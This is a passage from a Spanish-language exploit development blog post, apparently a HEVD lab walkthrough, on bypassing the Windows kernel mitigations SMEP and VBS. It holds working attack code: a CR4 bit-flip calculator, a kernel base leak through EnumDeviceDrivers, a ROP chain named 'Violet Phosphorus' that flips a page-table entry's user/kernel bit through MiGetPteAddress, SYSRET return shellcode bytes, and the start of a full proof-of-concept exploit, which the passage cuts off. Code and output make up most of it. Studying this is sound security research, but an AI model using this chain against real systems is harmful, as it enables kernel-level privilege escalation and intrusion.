+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> mask <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (bit_position <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (cr4 <span style="color:#f92672">^</span> mask);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s &lt;current cr4 value&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  num <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoll</span>(argv[<span style="color:#ae81ff">1</span>], NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;OLD CR4:</span><span style="color:#ae81ff">\n\n\t</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(PRINTF_BINARY_PATTERN_INT64, <span style="color:#a6e22e">PRINTF_BYTE_TO_BINARY_INT64</span>(num));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  num <span style="color:#f92672">=</span> <span style="color:#a6e22e">flip_bit</span>(num, <span style="color:#ae81ff">20</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NEW CR4</span><span style="color:#ae81ff">\n\n\t</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(PRINTF_BINARY_PATTERN_INT64, <span style="color:#a6e22e">PRINTF_BYTE_TO_BINARY_INT64</span>(num));
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Result: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, num);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Ejecutémoslo:</p>
+<pre tabindex="0"><code>$ ./get_cr4 0x0000000000b50ef8
+OLD CR4:
+
+        00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 
+NEW CR4
+
+        00000000 00000000 00000000 00000000 00000000 10111101 00001110 11111000 
+
+Result: 0xbd0ef8
+</code></pre><p>Básicamente tenemos que mover este valor dentro de CR4 para apagar SMEP&hellip; Mientras estudiaba métodos sobre cómo hacer esto me encontré una publicación por <a href="https://fluidattacks.com/blog/hevd-smep-bypass/">fluidattacks</a> y observé que usaba un &ldquo;gadget&rdquo; de ROP dentro de el módulo <code>nt</code>, específicamente <code>KeFlushCurrentTb</code>. Podemos obtener nuestra versión de Windows usando Windbg con <code>vertarget</code>. Cuando lo ejecutamos, esta es la versión instalada:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/vertarget.png" alt="alt text"></p>
+<p>Con esto dicho. este &ldquo;gadget&rdquo; no estaría disponible para nosotros. Si buscamos otras funciones similares encontramos un &ldquo;gadget&rdquo; similar dentro de <code>nt!KeFlushCurrentTbImmediatley</code> con la diferencia principal siendo que usamos <code>RCX</code> sobre <code>EAX</code> para modificar el registro CR4:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/KeFlush.png" alt="alt text"></p>
+<p>Dado que las direcciones son aleatorias, necesitamos calcular la distancia a el ROP &ldquo;gadget&rdquo; desde el inicio del módulo <code>nt</code>:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/rva.png" alt="alt text"></p>
+<p>Aquí vemos que el distancia es <code>0x000000000039dc27</code>.</p>
+<h3 id="encontrar-gadgets-y-como-usarlos">Encontrar &ldquo;Gadgets&rdquo; y Como Usarlos</h3>
+<p>Ahora necesitamos encontrar un <code>pop rcx; ret</code> &ldquo;gadget&rdquo; para colocar el nuevo <code>CR4</code> en <code>RCX</code>. La podemos encontrar usando <a href="https://github.com/0vercl0k/rp">rp++</a>, que rápidamente se ha convertido en mi favorita herramienta para descubrimiento de &ldquo;gadgets&rdquo; de ROP. Aquí buscamos gadgets dentro de <code>ntoskrnl.exe</code> porque este es el módulo principal de el Kernel para el Windows OS. Puedes hacerlo así.</p>
+<pre tabindex="0"><code>rp-win.exe --rop=50 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
+</code></pre><p>Luego podemos analizar los resultados con powershell.</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/pwoershell.png" alt="alt text"></p>
+<p>Usando estas distancias podemos confirmar que tenemos un &ldquo;gadget&rdquo; que trabaja en WinDbg.</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/confirm.png" alt="alt text"></p>
+<p>Sin embargo, todavía tendremos que lidiar con la aleatorización de el módulo <code>nt</code>&hellip;</p>
+<h3 id="encontrar-la-dirección-base-de-el-kernel">Encontrar la dirección base de el Kernel</h3>
+<p>Si pudieras ver dentro de mi mente durante este período de estudio, habrías visto puro temor. Dado que quando estas bajode &ldquo;user-mode&rdquo; normalmente necesitas una primitiva de leer para obtener la dirección de base para un módulo. Sin embargo, en mu investigación descubrirá que existen múltiples métodos para obtener la base de un módulo.</p>
+<p>Terminé usando un método conocido aprovechando <code>EnumDeviceDrivers</code>.</p>
+<p>El código se puede ver aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ULONG_PTR pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    LPVOID <span style="color:#f92672">*</span>lpImageBase <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD dwBytesNeeded <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate heap for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Kernel Base Address: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pKernelBaseAddress;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Deberíamos tener todo lo necesario para ejecutar código! ¿Sí? No :(</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/error.png" alt="alt text"></p>
+<p>Al juntar todo, obtenemos el error visto arriba (ignorar la ubicación diferente del &ldquo;gadget&rdquo;, en este punto no podía entender que esto no funcionara y probé diferentes &ldquo;gadgets&rdquo;).</p>
+<p>Qué pasó? Bueno.. parece que nos encontramos con una nueva protección de la memoria en que yo nunca he oído <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf">Seguridad basada en la virtualización / &ldquo;Virtualization-Based Security&rdquo; (VBS)</a>, que significa <a href="https://www.microsoft.com/en-us/security/blog/2017/03/27/detecting-and-mitigating-elevation-of-privilege-exploit-for-cve-2017-0005/#:~:text=Unauthorized%20modifications,instantly.">modificaciones que no son autorizadas a modificar secciones de el registro CR4, incluyendo SMEP estaran bloqueado instantáneamente</a></p>
+<h2 id="evadiendo-vbs-teoría">Evadiendo VBS (Teoría)</h2>
+<p>Después de ver cómo otros han asumido esto, quedó claro que el idea es cambiar un bit dentro de un entrada dentro de una tabla de página o &ldquo;Page Table Entry&rdquo; (PTE) respectivo a la ubicación de la memoria para nuestro shellcode. Si no me recuerdo mal, cuando intentamos ejecutar el shellcode directamente, obtuvimos este error:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/error_pte.png" alt="alt text"></p>
+<p>Básicamente, la forma en que se aplica SMEP es por cada sección de memoria, por el &ldquo;U/S PTE&rdquo; bit. Veamos esto con <code>!pte</code> dentro de WinDbg contra nuestro shellcode en &ldquo;userland&rdquo; para entender los permisos sobre el PTE.</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/pte_output.png" alt="alt text"></p>
+<p>Entonces, qué pasaría si aclaráramos el bit (U)? Si se voltea, en teoría esto se convierte en página de el Kernel. La ubicación de el bit U se mira aqui:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/pte_bits.png" alt="alt text"></p>
+<p>Establecer un punto de interrupción dentro de <code>HEVD+0x866b9</code> y encender y apagar el VM. Una vez golpeado, podemos modificar PTE asi:</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/flip_bit.png" alt="alt text"></p>
+<p>Una vez ejecutado, podemos ver que obtuvimos la ejecución de código y sobrescribimos RAX con 0xDEADBEEF. Ahora tenemos una ruta sólida para evider SMEP y VBS pero cómo podemos hacer esto dinamicamente&hellip;.</p>
+<h1 id="violet-phosphorus">Violet Phosphorus</h1>
+<p>Con nuestro análisis completo, decidí poner mi teoría en práctica y crea <code>Violet Phosphorus</code> un método universal para evadir SMEP/VBS. Podemos llamar a esto el sucesor de el <a href="https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/">White Phosphorus Exploit Pack</a>? O sería demasiado&hellip; puedes encontrar la cadena aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
+</span></span><span style="display:flex;"><span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     userland code. The setup is as follows:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       RAX -&gt; VOID *MiGetPteAddress(
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ( RCX == PTE / Userland Code )
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       );
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
+</span></span><span style="display:flex;"><span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa74d93</span>; <span style="color:#75715e">// pop rcx ; ret     [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)shellcode;     <span style="color:#75715e">// *shellcode        [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b560</span>; <span style="color:#75715e">// MiGetPteAddress() [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
+</span></span><span style="display:flex;"><span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2ffbfb</span>; <span style="color:#75715e">// sub rax, rdx ; ret                [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa6f2f5</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret          [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2107b2</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
+</span></span></span></code></pre></div><h2 id="entendiendo-la-cadena-de-rop">Entendiendo la Cadena de &ldquo;ROP&rdquo;</h2>
+<p>Si somos honestos, existen otras formas de evitar VBS/SMEP pero de lo que he visto la mayoría requiere un primitivo para leer memoria. Nosotros no necesitamos sufrir cuando Microsoft los da una función para obtener esta información dinámicamente. Aquí está el código dentro de WinDbg para la función <em>MiGetPteAddress()</em>:</p>
+<pre tabindex="0"><code>0: kd&gt; u nt!MiGetPteAddress
+nt!MiGetPteAddress:
+fffff800`4d67f770 48c1e909                shr     rcx,9
+fffff800`4d67f774 48b8f8ffffff7f000000    mov rax,7FFFFFFFF8h
+fffff800`4d67f77e 4823c8                  and     rcx,rax
+fffff800`4d67f781 48b80000000080f0ffff    mov rax,0FFFFF08000000000h
+fffff800`4d67f78b 4803c1                  add     rax,rcx
+fffff800`4d67f78e c3                      ret
+</code></pre><p>Por lo que he visto en el &ldquo;público&rdquo;, normalmente la gente usa esta función para filtrar la dirección base de todos los PTE&rsquo;s. Demos un paso atrás y preguntémonos qué hace realmente esta función? Nosotras ni siquiera necesitamos Ghidra para hazer esto. Escribamos código en C para demostrar esto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* wetw0rk */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int64_t</span> <span style="color:#a6e22e">MiGetPteAddress</span>(<span style="color:#66d9ef">int64_t</span> rcx)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    rcx <span style="color:#f92672">=</span> rcx <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">9</span>;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7FFFFFFFF8</span>;
+</span></span><span style="display:flex;"><span>    rcx <span style="color:#f92672">=</span> rcx <span style="color:#f92672">&amp;</span> rax;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0FFFFF08000000000</span>;
+</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> rax <span style="color:#f92672">+</span> rcx;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rax;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;PTE Located @{ 0x%llx }</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">MiGetPteAddress</span>(<span style="color:#ae81ff">0x00000220c16d0000</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Si compilamos esto, vemos que nos da la dirección del PTE.</p>
+<pre tabindex="0"><code>┌──(wetw0rk㉿kali)-[~]
+└─$ gcc MiGetPteAddress.c -o meme
+                                                                                                                                                                                                                                             
+┌──(wetw0rk㉿kali)-[~]
+└─$ ./meme 
+PTE Located @{ 0xfffff0811060b680 }
+</code></pre><p>Esto significa que podemos aprovechar esta función existente para manipular la PTE directamente. Tenga en cuenta que  estamos corriendo en el contexto de el Kernel, esto significa que podemos llamar Bill Gates si queremos.</p>
+<p>Ahora, todo lo que tenemos que hacer es pasarle a esta función la dirección de nuestro shellcode y, a cambio, esta función devolverá el PTE respectivo a nuestra memoria. Que perfecto :)</p>
+<p>Tener la dirección del PTE, nosotros simplemente necesitamos voltear el <code>U</code> bit a <code>K</code>. Qué operación de matemática tan duro que un profesor de Harvard incluso sufriría haciendo?</p>
+<p>XOR!</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; &#34;0x&#34; + hex(0x0000000226D83867 ^ 4)[2:].zfill(16)
+&#39;0x0000000226d83863&#39;
+</code></pre><p>Sabes lo que esto significa?</p>
+<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/captain.gif" alt="alt text"></p>
+<h1 id="creando-una-prueba-de-concepto-poc">Creando una Prueba de Concepto (POC)</h1>
+<p>En este punto tenemos todo lo que necesitamos para ejecutar código&hellip; pero el regreso a &ldquo;userland&rdquo;. Normalmente es mejor restaurar el flujo de ejecución manualmente. Sin embargo, decidí usar en su lugar <a href="https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html">&ldquo;Kristal-G&rsquo;s SYSRET&rdquo;</a> shellcode - una técnica genérica que permite que regresemos del Kernel. Según tengo entendido este código es el primero de su tipo (aparte de la <a href="https://github.com/vnik5287/sock_diag_x64/blob/486ce10dbef95776b22f228a74afe39ec9a0e16c/sockdiag_smep.c#L59">versión de Linux</a>). Puedes generar el código de Kristal-G sobre <a href="https://github.com/wetw0rk/Sickle">Sickle</a> como se demuestra aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00&#34;</span> // movabs rax, qword ptr gs:<span style="color:#f92672">[</span>0x188<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\x8b\x88\xe4\x01\x00\x00&#34;</span>                 // mov cx, word ptr <span style="color:#f92672">[</span>rax + 0x1e4<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\xff\xc1&#34;</span>                                 // inc cx
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\x89\x88\xe4\x01\x00\x00&#34;</span>                 // mov word ptr <span style="color:#f92672">[</span>rax + 0x1e4<span style="color:#f92672">]</span>, cx
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\x90\x90\x00\x00\x00&#34;</span>                 // mov rdx, qword ptr <span style="color:#f92672">[</span>rax + 0x90<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\x8a\x68\x01\x00\x00&#34;</span>                 // mov rcx, qword ptr <span style="color:#f92672">[</span>rdx + 0x168<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x4c\x8b\x9a\x78\x01\x00\x00&#34;</span>                 // mov r11, qword ptr <span style="color:#f92672">[</span>rdx + 0x178<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\xa2\x80\x01\x00\x00&#34;</span>                 // mov rsp, qword ptr <span style="color:#f92672">[</span>rdx + 0x180<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\xaa\x58\x01\x00\x00&#34;</span>                 // mov rbp, qword ptr <span style="color:#f92672">[</span>rdx + 0x158<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0&#34;</span>                                     // xor eax, eax
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0f\x01\xf8&#34;</span>                                 // swapgs 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x0f\x07&#34;</span>                                 // sysretq
+</span></span></code></pre></div><p>Aquí está el código, ten en cuenta que las distancias pueden ser diferentes según el versión de Windows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// I/O Request Packets (IRPs)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 4242
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ULONG_PTR pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    LPVOID <span style="color:#f92672">*</span>lpImageBase <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD dwBytesNeeded <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
